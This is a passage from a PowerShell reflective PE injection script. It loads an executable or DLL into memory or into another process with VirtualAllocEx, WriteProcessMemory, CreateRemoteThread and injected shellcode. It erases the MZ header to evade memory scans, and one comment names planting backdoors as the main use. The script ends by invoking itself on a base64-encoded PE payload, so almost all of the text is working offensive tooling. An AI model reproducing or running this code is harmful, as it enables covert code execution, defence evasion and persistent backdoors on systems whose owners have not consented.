        $Win32Constants = Get-Win32Constants
        $Win32Functions = Get-Win32Functions
        $Win32Types = Get-Win32Types

        $RemoteLoading = $false
        if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
        {
            $RemoteLoading = $true
        }

        #Get basic PE information
        Write-Verbose "Getting basic PE information from the file"
        $PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
        $OriginalImageBase = $PEInfo.OriginalImageBase
        $NXCompatible = $true
        if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
        {
            Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
            $NXCompatible = $false
        }

        #Verify that the PE and the current process are the same bits (32bit or 64bit)
        $Process64Bit = $true
        if ($RemoteLoading -eq $true)
        {
            $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
            $Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "IsWow64Process")
            if ($Result -eq [IntPtr]::Zero)
            {
                Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
            }

            [Bool]$Wow64Process = $false
            $Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
            if ($Success -eq $false)
            {
                Throw "Call to IsWow64Process failed"
            }

            if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
            {
                $Process64Bit = $false
            }

            #PowerShell needs to be same bit as the PE being loaded for IntPtr to work correctly
            $PowerShell64Bit = $true
            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
            {
                $PowerShell64Bit = $false
            }
            if ($PowerShell64Bit -ne $Process64Bit)
            {
                throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
            }
        }
        else
        {
            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
            {
                $Process64Bit = $false
            }
        }
        if ($Process64Bit -ne $PEInfo.PE64Bit)
        {
            Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
        }

        #Allocate memory and write the PE to memory. If the PE supports ASLR, allocate to a random memory address
        Write-Verbose "Allocating memory for the PE and write its headers to memory"

        #ASLR check
        [IntPtr]$LoadAddr = [IntPtr]::Zero
        $PESupportsASLR = ([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -eq $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
        if ((-not $ForceASLR) -and (-not $PESupportsASLR))
        {
            Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again OR try using the -ForceASLR flag (could cause crashes)" -WarningAction Continue
            [IntPtr]$LoadAddr = $OriginalImageBase
        }
        elseif ($ForceASLR -and (-not $PESupportsASLR))
        {
            Write-Verbose "PE file doesn't support ASLR but -ForceASLR is set. Forcing ASLR on the PE file. This could result in a crash."
        }

        if ($ForceASLR -and $RemoteLoading)
        {
            Write-Error "Cannot use ForceASLR when loading in to a remote process." -ErrorAction Stop
        }
        if ($RemoteLoading -and (-not $PESupportsASLR))
        {
            Write-Error "PE doesn't support ASLR. Cannot load a non-ASLR PE in to a remote process" -ErrorAction Stop
        }

        $PEHandle = [IntPtr]::Zero              #This is where the PE is allocated in PowerShell
        $EffectivePEHandle = [IntPtr]::Zero     #This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PEHandle. If it is loaded in a remote process, this is the address in the remote process.
        if ($RemoteLoading -eq $true)
        {
            #Allocate space in the remote process, and also allocate space in PowerShell. The PE will be setup in PowerShell and copied to the remote process when it is setup
            $PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)

            #todo, error handling needs to delete this memory if an error happens along the way
            $EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            if ($EffectivePEHandle -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
            }
        }
        else
        {
            if ($NXCompatible -eq $true)
            {
                $PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            }
            else
            {
                $PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            }
            $EffectivePEHandle = $PEHandle
        }

        [IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
        if ($PEHandle -eq [IntPtr]::Zero)
        {
            Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
        }
        [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null


        #Now that the PE is in memory, get more detailed information about it
        Write-Verbose "Getting detailed PE information from the headers loaded in memory"
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        $PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
        $PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
        Write-Verbose "StartAddress: $(Get-Hex $PEHandle)    EndAddress: $(Get-Hex $PEEndAddress)"


        #Copy each section from the PE in to memory
        Write-Verbose "Copy PE sections in to memory"
        Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types


        #Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
        Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
        Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types


        #The PE we are in-memory loading has DLLs it needs, import those DLLs for it
        Write-Verbose "Import DLL's needed by the PE we are loading"
        if ($RemoteLoading -eq $true)
        {
            Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
        }
        else
        {
            Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
        }


        #Update the memory protection flags for all the memory just allocated
        if ($RemoteLoading -eq $false)
        {
            if ($NXCompatible -eq $true)
            {
                Write-Verbose "Update memory protection flags"
                Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
            }
            else
            {
                Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
            }
        }
        else
        {
            Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
        }


        #If remote loading, copy the DLL in to remote process memory
        if ($RemoteLoading -eq $true)
        {
            [UInt32]$NumBytesWritten = 0
            $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
            if ($Success -eq $false)
            {
                Throw "Unable to write shellcode to remote process memory."
            }
        }


        #Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
        if ($PEInfo.FileType -ieq "DLL")
        {
            if ($RemoteLoading -eq $false)
            {
                Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
                $DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
                $DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
                $DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)

                $DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
            }
            else
            {
                $DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)

                if ($PEInfo.PE64Bit -eq $true)
                {
                    #Shellcode: CallDllMain.asm
                    $CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
                    $CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
                    $CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
                }
                else
                {
                    #Shellcode: CallDllMain.asm
                    $CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
                    $CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
                    $CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
                }
                $SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
                $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
                $SCPSMemOriginal = $SCPSMem

                Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
                Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
                Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)

                $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
                if ($RSCAddr -eq [IntPtr]::Zero)
                {
                    Throw "Unable to allocate memory in the remote process for shellcode"
                }

                $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
                if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
                {
                    Throw "Unable to write shellcode to remote process memory."
                }

                $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
                $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
                if ($Result -ne 0)
                {
                    Throw "Call to CreateRemoteThread to call GetProcAddress failed."
                }

                $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
            }
        }
        elseif ($PEInfo.FileType -ieq "EXE")
        {
            #Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
            [IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
            [System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
            $OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

            #If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
            #   This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
            [IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
            Write-Verbose "Call EXE Main function. Address: $(Get-Hex $ExeMainPtr). Creating thread for the EXE to run in."

            $Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

            while($true)
            {
                [Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
                if ($ThreadDone -eq 1)
                {
                    Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
                    Write-Verbose "EXE thread has completed."
                    break
                }
                else
                {
                    Start-Sleep -Seconds 1
                }
            }
        }

        return @($PEInfo.PEHandle, $EffectivePEHandle)
    }


    Function Invoke-MemoryFreeLibrary
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $PEHandle
        )

        #Get Win32 constants and functions
        $Win32Constants = Get-Win32Constants
        $Win32Functions = Get-Win32Functions
        $Win32Types = Get-Win32Types

        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants

        #Call FreeLibrary for all the imports of the DLL
        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
        {
            [IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)

            while ($true)
            {
                $ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)

                #If the structure is null, it signals that this is the end of the array
                if ($ImportDescriptor.Characteristics -eq 0 `
                        -and $ImportDescriptor.FirstThunk -eq 0 `
                        -and $ImportDescriptor.ForwarderChain -eq 0 `
                        -and $ImportDescriptor.Name -eq 0 `
                        -and $ImportDescriptor.TimeDateStamp -eq 0)
                {
                    Write-Verbose "Done unloading the libraries needed by the PE"
                    break
                }

                $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
                $ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

                if ($ImportDllHandle -eq $null)
                {
                    Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
                }

                $Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
                if ($Success -eq $false)
                {
                    Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
                }

                $ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
            }
        }

        #Call DllMain with process detach
        Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
        $DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
        $DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
        $DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)

        $DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null


        $Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
        if ($Success -eq $false)
        {
            Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
        }
    }


    Function Main
    {
        $Win32Functions = Get-Win32Functions
        $Win32Types = Get-Win32Types
        $Win32Constants =  Get-Win32Constants

        $RemoteProcHandle = [IntPtr]::Zero

        #If a remote process to inject in to is specified, get a handle to it
        if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
        {
            Throw "Can't supply a ProcId and ProcName, choose one or the other"
        }
        elseif ($ProcName -ne $null -and $ProcName -ne "")
        {
            $Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
            if ($Processes.Count -eq 0)
            {
                Throw "Can't find process $ProcName"
            }
            elseif ($Processes.Count -gt 1)
            {
                $ProcInfo = Get-Process | Where-Object { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
                Write-Output $ProcInfo
                Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
            }
            else
            {
                $ProcId = $Processes[0].ID
            }
        }

        #Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
        #If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
#       if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
#       {
#           Write-Verbose "Getting SeDebugPrivilege"
#           Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
#       }

        if (($ProcId -ne $null) -and ($ProcId -ne 0))
        {
            $RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
            if ($RemoteProcHandle -eq [IntPtr]::Zero)
            {
                Throw "Couldn't obtain the handle for process ID: $ProcId"
            }

            Write-Verbose "Got the handle for the remote process to inject in to"
        }


        #Load the PE reflectively
        Write-Verbose "Calling Invoke-MemoryLoadLibrary"
        $PEHandle = [IntPtr]::Zero
        if ($RemoteProcHandle -eq [IntPtr]::Zero)
        {
            $PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -ForceASLR $ForceASLR
        }
        else
        {
            $PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle -ForceASLR $ForceASLR
        }
        if ($PELoadedInfo -eq [IntPtr]::Zero)
        {
            Throw "Unable to load PE, handle returned is NULL"
        }

        $PEHandle = $PELoadedInfo[0]
        $RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process


        #Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
        {
            #########################################
            ### YOUR CODE GOES HERE
            #########################################
            switch ($FuncReturnType)
            {
                'WString' {
                    Write-Verbose "Calling function with WString return type"
                    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "WStringFunc"
                    if ($WStringFuncAddr -eq [IntPtr]::Zero)
                    {
                        Throw "Couldn't find function address."
                    }
                    $WStringFuncDelegate = Get-DelegateType @() ([IntPtr])
                    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
                    [IntPtr]$OutputPtr = $WStringFunc.Invoke()
                    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
                    Write-Output $Output
                }

                'String' {
                    Write-Verbose "Calling function with String return type"
                    [IntPtr]$StringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "StringFunc"
                    if ($StringFuncAddr -eq [IntPtr]::Zero)
                    {
                        Throw "Couldn't find function address."
                    }
                    $StringFuncDelegate = Get-DelegateType @() ([IntPtr])
                    $StringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StringFuncAddr, $StringFuncDelegate)
                    [IntPtr]$OutputPtr = $StringFunc.Invoke()
                    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($OutputPtr)
                    Write-Output $Output
                }

                'Void' {
                    Write-Verbose "Calling function with Void return type"
                    [IntPtr]$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
                    if ($VoidFuncAddr -eq [IntPtr]::Zero)
                    {
                        Throw "Couldn't find function address."
                    }
                    $VoidFuncDelegate = Get-DelegateType @() ([Void])
                    $VoidFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VoidFuncAddr, $VoidFuncDelegate)
                    $VoidFunc.Invoke() | Out-Null
                }
            }
            #########################################
            ### END OF YOUR CODE
            #########################################
        }
        #For remote DLL injection, call a void function which takes no parameters
        elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
        {
            $VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
            if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
            {
                Throw "VoidFunc couldn't be found in the DLL"
            }

            $VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
            $VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle

            #Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
            $Null = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
        }

        #Don't free a library if it is injected in a remote process or if it is an EXE.
        #Note that all DLL's loaded by the EXE will remain loaded in memory.
        if ($RemoteProcHandle -eq [IntPtr]::Zero -and $PEInfo.FileType -ieq "DLL")
        {
            Invoke-MemoryFreeLibrary -PEHandle $PEHandle
        }
        else
        {
            #Delete the PE file from memory.
            $Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
            if ($Success -eq $false)
            {
                Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
            }
        }

        Write-Verbose "Done!"
    }

    Main
}

#Main function to either run the script locally or remotely
Function Main
{
    if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
    {
        $DebugPreference  = "Continue"
    }

    Write-Verbose "PowerShell ProcessID: $PID"

    #Verify the image is a valid PE file
    $e_magic = ($PEBytes[0..1] | ForEach-Object {[Char] $_}) -join ''

    if ($e_magic -ne 'MZ')
    {
        throw 'PE is not a valid PE file.'
    }

    if (-not $DoNotZeroMZ) {
        # Remove 'MZ' from the PE file so that it cannot be detected by .imgscan in WinDbg
        # TODO: Investigate how much of the header can be destroyed, I'd imagine most of it can be.
        $PEBytes[0] = 0
        $PEBytes[1] = 0
    }

    #Add a "program name" to exeargs, just so the string looks as normal as possible (real args start indexing at 1)
    if ($ExeArgs -ne $null -and $ExeArgs -ne '')
    {
        $ExeArgs = "ReflectiveExe $ExeArgs"
    }
    else
    {
        $ExeArgs = "ReflectiveExe"
    }

    if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
    {
        Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR)
    }
    else
    {
        Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR) -ComputerName $ComputerName
    }
}

Main
}
Invoke-ReflectivePEInjection -PEBytes $([System.Convert]::FromBase64String("TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAyAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAAA5JBHdfUV/jn1Ff459RX+OWoMEjn5Ff459RX6Of0V/jnQ96o58RX+OdD3ujnxFf45SaWNofUV/jgAAAAAAAAAAAAAAAAAAAABQRQAAZIYDAH08xksAAAAAAAAAAPAAIwALAgEAAFADAAAQAAAAAAAAAEAAAAAQAAAAAABAAQAAAAAQAAAAAgAABAAAAAAAAAAEAAAAAAAAAMBpAwBIAgAACIADAAIAAIAAABAAAAAAAAAQAAAAAAAAAAAQAAAAAAAAEAAAAAAAAAAAAAAQAAAAAAAAAAAAAABIaQMAbAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALhpAwAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAABgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAudGV4dAAAAE4QAAAAEAAAABIAAAAEAAAAAAAAAAAAAAAAAAAgAABgLnJkYXRhAACEAAAAADAAAAACAAAAFgAAAAAAAAAAAAAAAAAAQAAAQC50a2luAAAAwCkDAABAAAAAKgMAABgAAAAAAAAAAAAAAAAAACAAAOAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEiD7ChJx8FAAAAAScfAADAAAEjHwgAQAABIM8noJxAAAEjHwQAQAABIvkEQAEABAAAASIv486T/0EgzyegBEAAAUEFZTE9BRDoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA